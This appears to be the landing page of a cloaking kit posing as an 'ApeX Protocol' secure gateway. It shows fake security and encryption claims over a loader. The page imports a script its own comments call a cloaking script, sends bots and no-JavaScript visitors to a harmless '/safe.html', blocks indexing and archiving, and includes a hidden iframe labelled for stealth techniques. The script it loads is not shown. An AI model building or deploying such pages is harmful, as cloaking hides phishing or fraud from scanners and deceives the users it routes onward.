<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="format-detection" content="telephone=no" />
    
    <!-- Critical: Prevent caching and indexing -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate, max-age=0" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <meta name="robots" content="noindex, nofollow, noarchive" />
    <meta name="googlebot" content="noindex, nofollow, noarchive" />
    
    <!-- Security Headers (meta equivalent) -->
    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
    <meta http-equiv="X-Frame-Options" content="DENY" />
    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin" />
    
    <title>ApeX Protocol | Secure Gateway</title>
    
    <!-- Preconnect for performance -->
    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin />
    <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com" />
    
    <!-- Critical CSS inline for fastest rendering -->
    <style>
        /* Reset & Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Optimized Critical Path CSS */
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            position: relative;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Animated background - hardware accelerated */
        .bg-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 30%, rgba(255,107,0,0.08) 0%, transparent 30%),
                        radial-gradient(circle at 80% 70%, rgba(255,107,0,0.08) 0%, transparent 30%);
            z-index: 0;
            will-change: transform;
            animation: subtleShift 20s ease infinite alternate;
        }

        @keyframes subtleShift {
            0% { transform: scale(1); opacity: 0.8; }
            100% { transform: scale(1.05); opacity: 1; }
        }

        /* Main container with glassmorphism */
        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            max-width: min(90%, 600px);
            padding: clamp(1.5rem, 5vw, 2.5rem);
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border-radius: 32px;
            border: 1px solid rgba(255,107,0,0.15);
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
            margin: 1rem;
        }

        /* Logo with smooth gradient */
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 1.5rem;
        }

        .logo i {
            font-size: clamp(2rem, 8vw, 3rem);
            color: #ff6b00;
            filter: drop-shadow(0 0 15px rgba(255,107,0,0.5));
            transition: transform 0.3s ease;
        }

        .logo:hover i {
            transform: scale(1.05);
        }

        .logo span {
            font-size: clamp(1.8rem, 6vw, 2.2rem);
            font-weight: 700;
            letter-spacing: 2px;
            background: linear-gradient(135deg, #fff 0%, #ff6b00 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* Optimized loader animation */
        .loader {
            display: inline-block;
            width: min(64px, 15vw);
            height: min(64px, 15vw);
            border: 4px solid rgba(255,107,0,0.2);
            border-top: 4px solid #ff6b00;
            border-right: 4px solid #ff6b00;
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 2rem auto;
            box-shadow: 0 0 25px rgba(255,107,0,0.3);
            will-change: transform;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Typography with responsive sizing */
        h2 {
            font-size: clamp(1.4rem, 5vw, 1.8rem);
            font-weight: 500;
            margin-bottom: 1rem;
            color: #e2e8f0;
            line-height: 1.3;
        }

        p {
            font-size: clamp(0.9rem, 3vw, 1rem);
            color: #94a3b8;
            line-height: 1.6;
            margin-bottom: 0.5rem;
        }

        .sub-text {
            font-size: clamp(0.8rem, 2.5vw, 0.9rem);
            color: #64748b;
        }

        /* Security badge with glow effect */
        .security-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(255,107,0,0.1);
            padding: 0.75rem 1.5rem;
            border-radius: 40px;
            border: 1px solid rgba(255,107,0,0.3);
            margin-top: 1.5rem;
            font-size: 0.9rem;
            color: #ffd7b3;
            backdrop-filter: blur(4px);
            transition: all 0.3s ease;
        }

        .security-badge i {
            color: #ff6b00;
            font-size: 1rem;
        }

        .security-badge:hover {
            background: rgba(255,107,0,0.15);
            border-color: rgba(255,107,0,0.5);
            transform: translateY(-2px);
        }

        /* Footer */
        footer {
            margin-top: 2rem;
            font-size: 0.75rem;
            color: #475569;
        }

        footer i {
            margin-right: 4px;
        }

        /* Noscript fallback styling */
        .noscript-container {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 500px;
            z-index: 100;
        }

        .noscript-warning {
            padding: 1rem;
            background: rgba(220, 38, 38, 0.95);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 99, 99, 0.5);
            border-radius: 16px;
            color: white;
            font-size: 0.95rem;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
        }

        .noscript-warning a {
            color: #ffb347;
            text-decoration: none;
            font-weight: 600;
            padding: 4px 8px;
            border-radius: 20px;
            background: rgba(255,255,255,0.1);
            transition: background 0.2s;
        }

        .noscript-warning a:hover {
            background: rgba(255,255,255,0.2);
        }

        /* Reduced motion preference */
        @media (prefers-reduced-motion: reduce) {
            .loader, .bg-particles {
                animation: none;
            }
        }

        /* Touch optimization */
        @media (hover: none) and (pointer: coarse) {
            .security-badge, .logo {
                transition: none;
            }
        }
    </style>
    
    <!-- Deferred non-critical styles -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'" />
    
    <!-- Cloaking script - loaded with error boundary -->
    <script type="module">
        (function() {
            // Error boundary for cloaking script
            window.addEventListener('error', function(e) {
                console.error('Cloaking script error:', e.error);
                // Fallback to safe page on script error
                window.location.replace('/safe.html');
            });
            
            // Load the actual cloaking script
            import('./Java/clocking.js').catch(error => {
                console.error('Failed to load cloaking script:', error);
                window.location.replace('/safe.html');
            });
        })();
    </script>
</head>
<body>
    <!-- Animated background -->
    <div class="bg-particles" aria-hidden="true"></div>
    
    <!-- Main content -->
    <div class="container" role="main">
        <div class="logo" aria-label="ApeX Protocol Logo">
            <i class="fas fa-ape" aria-hidden="true"></i>
            <span>APEX</span>
        </div>
        
        <div class="loader" role="status" aria-label="Loading"></div>
        
        <h2>Establishing Secure Connection</h2>
        <p>Validating environment • Applying security policies</p>
        <p class="sub-text">Routing to optimal gateway</p>
        
        <div class="security-badge" role="status">
            <i class="fas fa-shield-alt" aria-hidden="true"></i>
            <span>AI-Powered Threat Detection Active</span>
        </div>

        <footer>
            <i class="fas fa-lock" aria-hidden="true"></i>
            <span>End-to-end encrypted • v3.0.1</span>
        </footer>
    </div>

    <!-- Fallback for users with JavaScript disabled -->
    <noscript>
        <div class="noscript-container">
            <div class="noscript-warning">
                <i class="fas fa-exclamation-triangle" aria-hidden="true"></i>
                <strong>JavaScript Required:</strong> Please enable JavaScript or 
                <a href="/safe.html">click here</a> to continue securely.
            </div>
        </div>
        
        <!-- Immediate redirect for bots without JS -->
        <meta http-equiv="refresh" content="0; url=/safe.html">
    </noscript>
    
    <!-- Preload hints for critical resources -->
    <link rel="preload" href="./Java/clocking.js" as="script" crossorigin />
    
    <!-- Hidden iframe for potential stealth techniques (optional) -->
    <iframe src="about:blank" style="display:none" aria-hidden="true"></iframe>
</body>
</html>
